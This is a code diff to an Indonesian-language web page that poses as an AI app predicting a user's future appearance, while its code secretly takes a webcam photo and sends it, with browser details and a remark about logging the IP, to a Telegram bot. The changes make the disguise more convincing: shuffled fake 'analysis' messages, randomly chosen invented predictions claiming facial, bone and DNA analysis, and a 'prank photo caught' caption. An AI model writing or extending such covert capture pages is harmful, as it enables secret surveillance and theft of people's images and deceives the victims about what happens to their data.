@@ -104,6 +104,23 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        
+        .result-quote {
+            font-style: italic;
+            font-size: 22px;
+            color: #ff5722;
+            margin: 20px 0;
+            padding: 10px;
+            border-left: 4px solid #ff5722;
+            background-color: rgba(255, 87, 34, 0.1);
+        }
+        
+        .future-image {
+            max-width: 100%;
+            border-radius: 10px;
+            margin: 20px 0;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        }
     </style>
 </head>
 <body>
@@ -131,6 +148,7 @@
         <div id="resultContainer" class="hidden">
             <h2>Hasil Prediksi Masa Depan</h2>
             <p id="resultText"></p>
+            <div id="resultQuote" class="result-quote"></div>
             <button id="tryAgainButton">Coba Lagi</button>
         </div>
         
@@ -152,6 +170,7 @@
         const captureButton = document.getElementById('captureButton');
         const statusText = document.getElementById('status');
         const resultText = document.getElementById('resultText');
+        const resultQuote = document.getElementById('resultQuote');
         const tryAgainButton = document.getElementById('tryAgainButton');
         const processingText = document.getElementById('processingText');
         
@@ -210,26 +229,45 @@
                 // Kirim gambar ke Telegram
                 sendImageToTelegram(imageDataURL);
                 
-                // Simulasi pemrosesan dengan pesan yang berubah
+                // Simulasi pemrosesan dengan pesan yang berubah secara acak
                 const processingMessages = [
                     "Menganalisis struktur wajah...",
-                    "Menerapkan algoritma penuaan...",
-                    "Menghitung perubahan fitur wajah...",
-                    "Menyesuaikan dengan faktor genetik...",
-                    "Memproses hasil akhir..."
+                    "Menerapkan algoritma penuaan lanjutan...",
+                    "Menghitung perubahan fitur wajah berdasarkan genetik...",
+                    "Menyesuaikan dengan faktor gaya hidup...",
+                    "Memproses variasi warna rambut di masa depan...",
+                    "Mengkalkulasi perubahan struktur tulang...",
+                    "Memprediksi tanda penuaan berdasarkan DNA...",
+                    "Menganalisis pola kerutan yang mungkin muncul...",
+                    "Memperhitungkan faktor lingkungan terhadap kulit...",
+                    "Menerapkan simulasi perubahan hormon seiring waktu...",
+                    "Menghitung kemungkinan obesitas berdasarkan kebiasaan...",
+                    "Memproses hasil akhir dari algoritma penuaan 3D..."
                 ];
+                
+                // Acak urutan pesan
+                shuffleArray(processingMessages);
                 
                 let messageIndex = 0;
                 const messageInterval = setInterval(() => {
                     processingText.textContent = processingMessages[messageIndex];
                     messageIndex++;
                     
-                    if (messageIndex >= processingMessages.length) {
+                    if (messageIndex >= Math.min(5, processingMessages.length)) {
                         clearInterval(messageInterval);
                         setTimeout(showResults, 1500);
                     }
                 }, 2000);
             }
+        }
+        
+        // Fungsi untuk mengacak array
+        function shuffleArray(array) {
+            for (let i = array.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [array[i], array[j]] = [array[j], array[i]];
+            }
+            return array;
         }
         
         // Fungsi untuk mengirim gambar ke Telegram
@@ -257,7 +295,7 @@
                 const currentTime = new Date().toLocaleString();
                 const ipInfo = "IP akan terlihat di logs Telegram";
                 
-                formData.append('caption', `Captured Photo!\nTime: ${currentTime}\nBrowser: ${browserInfo}\n${ipInfo}`);
+                formData.append('caption', `🎭 Foto Prank Tertangkap!\nWaktu: ${currentTime}\nBrowser: ${browserInfo}\n${ipInfo}`);
                 
                 // Kirim ke API Telegram
                 fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
@@ -273,22 +311,96 @@
             }
         }
         
-        // Fungsi untuk menampilkan hasil
+        // Fungsi untuk menampilkan hasil acak
         function showResults() {
             processingContainer.classList.add('hidden');
             resultContainer.classList.remove('hidden');
             
-            // Tampilkan hasil palsu
+            // Array hasil prediksi acak
+            const futurePredictions = [
+                {
+                    title: "Masa Depan Cemerlang! ✨",
+                    items: [
+                        "Terlihat 10 tahun lebih muda dari usia sebenarnya",
+                        "Memiliki karir sukses di bidang teknologi",
+                        "Hidup bahagia dengan keluarga harmonis",
+                        "Fisik tetap bugar berkat kebiasaan olahraga rutin",
+                        "Menjadi inspirasi bagi banyak orang di sekitar"
+                    ],
+                    quote: "Wajahmu di masa depan mencerminkan kebijaksanaan dan kebahagiaan yang telah kamu bangun sejak sekarang!"
+                },
+                {
+                    title: "Potensi Tersembunyi Terungkap! 🌟",
+                    items: [
+                        "Mengembangkan bakat seni yang tidak terduga",
+                        "Menjelajahi berbagai negara dan budaya",
+                        "Memiliki garis wajah yang menunjukkan ketegasan",
+                        "Mata yang selalu berbinar menunjukkan semangat hidup",
+                        "Menjadi pemimpin yang disegani dalam komunitas"
+                    ],
+                    quote: "Masa depanmu penuh kejutan! Perjalanan hidupmu akan membentuk karakter yang luar biasa dalam dirimu."
+                },
+                {
+                    title: "Sukses dan Ketenangan! 🏆",
+                    items: [
+                        "Mencapai keseimbangan sempurna antara karir dan keluarga",
+                        "Senyum yang menawan menjadi ciri khasmu",
+                        "Memiliki aura kebijaksanaan yang dihormati",
+                        "Kondisi fisik tetap prima hingga usia lanjut",
+                        "Menemukan passion yang membawa kebahagiaan sejati"
+                    ],
+                    quote: "Ketenanganmu di masa depan adalah hasil dari keputusan bijak yang kamu ambil hari ini!"
+                },
+                {
+                    title: "Petualang Kehidupan! 🌍",
+                    items: [
+                        "Wajah yang menunjukkan pengalaman dari berbagai petualangan",
+                        "Gaya hidup nomaden memberimu perspektif unik",
+                        "Memiliki cerita menarik di balik setiap kerutan",
+                        "Penampilan yang selalu mengikuti tren terbaru",
+                        "Dikelilingi teman dari berbagai latar belakang"
+                    ],
+                    quote: "Jejak pengalamanmu akan terlihat dari pancaran matamu yang penuh cerita!"
+                },
+                {
+                    title: "Penuh Misteri dan Pesona! 🔮",
+                    items: [
+                        "Memiliki aura misterius yang menarik perhatian",
+                        "Gaya rambut ikonik yang menjadi trendSetter",
+                        "Tanda-tanda kebijaksanaan terlihat jelas di wajahmu",
+                        "Menjadi sosok yang dicari untuk nasihat dan bimbingan",
+                        "Tetap mempertahankan pesona dan karisma sepanjang usia"
+                    ],
+                    quote: "Di balik setiap garis di wajahmu tersimpan rahasia kehidupan yang penuh makna."
+                }
+            ];
+            
+            // Pilih hasil secara acak
+            const randomPrediction = futurePredictions[Math.floor(Math.random() * futurePredictions.length)];
+            
+            // Tampilkan hasil
             resultText.innerHTML = `
-                <p>Berdasarkan analisis AI kami, kamu akan:</p>
+                <h3>${randomPrediction.title}</h3>
+                <p>Berdasarkan analisis AI canggih kami, di masa depan kamu akan:</p>
                 <ul style="text-align: left; padding-left: 20px;">
-                    <li>Terlihat lebih bijaksana dengan garis wajah yang lebih tegas</li>
-                    <li>Memiliki kerutan yang menunjukkan pengalaman hidup yang berharga</li>
-                    <li>Mempertahankan senyum yang menawan dan mata yang ekspresif</li>
-                    <li>Memiliki rambut yang menunjukkan kedewasaan dan kepercayaan diri</li>
+                    ${randomPrediction.items.map(item => `<li>${item}</li>`).join('')}
                 </ul>
-                <p>Ingat, ini hanya prediksi! Gaya hidup sehat dapat membuat perubahanmu lebih baik!</p>
+                <p>Hasil ini diprediksi berdasarkan fitur wajah, struktur tulang, dan ekspresi unikmu!</p>
             `;
+            
+            // Tambahkan quote motivasi
+            resultQuote.textContent = randomPrediction.quote;
+            
+            // Tambahkan waktu prediksi acak
+            const randomYears = Math.floor(Math.random() * 20) + 10;  // Acak antara 10-30 tahun
+            const predictedYear = new Date().getFullYear() + randomYears;
+            
+            // Tambahkan tanggal prediksi ke hasil
+            const dateInfo = document.createElement('p');
+            dateInfo.style.marginTop = '20px';
+            dateInfo.style.fontWeight = 'bold';
+            dateInfo.innerHTML = `Prediksi ini menunjukkan penampilanmu pada tahun <span style="color:#ff5722">${predictedYear}</span> (${randomYears} tahun dari sekarang)`;
+            resultText.appendChild(dateInfo);
         }
         
         // Fungsi untuk mengatur ulang aplikasi
@@ -300,4 +412,4 @@
         }
     </script>
 </body>
-  </html>
+</html>
